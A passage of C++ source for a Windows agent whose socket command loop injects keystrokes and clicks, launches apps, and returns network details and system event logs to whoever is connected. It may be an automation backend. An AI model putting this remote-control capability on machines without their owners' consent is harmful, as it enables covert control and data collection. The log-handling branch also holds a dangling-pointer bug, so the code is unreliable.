                    response = "Invalid format. Use: send_keys <process_name> <keys>";
                }

                send(sock, response.c_str(), response.length(), 0);
            }
            else if (strncmp(buffer, "click_at ", 9) == 0)
            {
                std::string params = buffer + 9;
                std::istringstream iss(params);
                std::string processName;
                int x, y;

                if (iss >> processName >> x >> y)
                {
                    std::cout << "Clicking at position (" << x << ", " << y << ") in " << processName << std::endl;
                    response = click_at_position(processName, x, y);
                }
                else
                {
                    response = "Invalid format. Use: click_at <process_name> <x> <y>";
                }

                send(sock, response.c_str(), response.length(), 0);
            }
            else if (strncmp(buffer, "launch_app ", 11) == 0)
            {
                std::string appName = buffer + 11;

                // Trim leading and trailing whitespace
                appName.erase(0, appName.find_first_not_of(" \t\r\n"));
                appName.erase(appName.find_last_not_of(" \t\r\n") + 1);

                // Trim quotes if present
                if (appName.size() >= 2 && appName.front() == '"' && appName.back() == '"')
                {
                    appName = appName.substr(1, appName.size() - 2);
                }

                std::cout << "Launching application from Start Menu: " << appName << std::endl;
                response = launch_from_start_menu(appName);
                send(sock, response.c_str(), response.length(), 0);
            }
            else if (strncmp(buffer, "type ", 5) == 0)
            {
                std::string keys = buffer + 5;

                // Trim leading and trailing whitespace
                keys.erase(0, keys.find_first_not_of(" \t\r\n"));
                keys.erase(keys.find_last_not_of(" \t\r\n") + 1);

                std::cout << "Sending keystrokes to current focus: " << keys << std::endl;

                try
                {
                    response = send_keystrokes_at_cursor(keys);
                    send(sock, response.c_str(), response.length(), 0);
                }
                catch (const std::exception &e)
                {
                    std::string error_msg = "Error sending keystrokes: ";
                    error_msg += e.what();
                    std::cout << error_msg << std::endl;
                    send(sock, error_msg.c_str(), error_msg.length(), 0);
                }
                catch (...)
                {
                    std::string error_msg = "Unknown error occurred while sending keystrokes";
                    std::cout << error_msg << std::endl;
                    send(sock, error_msg.c_str(), error_msg.length(), 0);
                }
            }
            else if (strncmp(buffer, "youtube ", 8) == 0)
            {
                std::string url = buffer + 8;

                // Trim leading and trailing whitespace
                url.erase(0, url.find_first_not_of(" \t\r\n"));
                url.erase(url.find_last_not_of(" \t\r\n") + 1);

                std::cout << "Opening YouTube URL: " << url << std::endl;

                try
                {
                    response = open_youtube_without_ads(url);
                    send(sock, response.c_str(), response.length(), 0);
                }
                catch (const std::exception &e)
                {
                    std::string error_msg = "Error opening YouTube URL: ";
                    error_msg += e.what();
                    std::cout << error_msg << std::endl;
                    send(sock, error_msg.c_str(), error_msg.length(), 0);
                }
                catch (...)
                {
                    std::string error_msg = "Unknown error occurred while opening YouTube";
                    std::cout << error_msg << std::endl;
                    send(sock, error_msg.c_str(), error_msg.length(), 0);
                }
            }
            else if (strncmp(buffer, "search_process ", 15) == 0)
            {
                std::string process_name = buffer + 15;

                // Trim leading and trailing whitespace
                process_name.erase(0, process_name.find_first_not_of(" \t\r\n"));
                process_name.erase(process_name.find_last_not_of(" \t\r\n") + 1);

                std::cout << "Searching for process: " << process_name << std::endl;
                response = search_process(process_name);

                // Send the response
                send(sock, response.c_str(), response.length(), 0);

                // Send the end marker separately
                const char *end_marker = "##END_OF_SEARCH_RESULTS##";
                send(sock, end_marker, strlen(end_marker), 0);
            }
            else if (strcmp(buffer, "network") == 0)
            {
                std::string network_info = get_network_info();
                send(sock, network_info.c_str(), network_info.length(), 0);
            }
            else if (strcmp(buffer, "system_logs") == 0 || strncmp(buffer, "system_logs ", 12) == 0)
            {
                std::cout << "Retrieving system logs..." << std::endl;

                // Parse log type and count if provided
                const char *log_type = "System";
                int num_entries = 50;

                if (strncmp(buffer, "system_logs ", 12) == 0)
                {
                    char params[256] = {0};
                    strncpy_s(params, sizeof(params), buffer + 12, sizeof(params) - 1);

                    char *context = NULL;
                    char *token = strtok_s(params, " ", &context);
                    if (token)
                    {
                        log_type = token;
                        token = strtok_s(NULL, " ", &context);
                        if (token)
                        {
                            num_entries = atoi(token);
                            if (num_entries <= 0)
                                num_entries = 50;
                        }
                    }
                }

                response = get_system_logs(log_type, num_entries);

                // Send in chunks with a clear end marker
                const int chunk_size = 1024;
                for (size_t i = 0; i < response.length(); i += chunk_size)
                {
                    std::string chunk = response.substr(i, chunk_size);
                    send(sock, chunk.c_str(), chunk.length(), 0);
                    Sleep(50); // Small delay between chunks
                }

                // Send a special end marker
                const char *end_marker = "##END_OF_SYSTEM_LOGS##";
                send(sock, end_marker, strlen(end_marker), 0);
            }
            else
            {
                std::cout << "Unknown command: " << buffer << std::endl;
                response = "Unknown command";
                send(sock, response.c_str(), response.length(), 0);
            }
        }
    }
}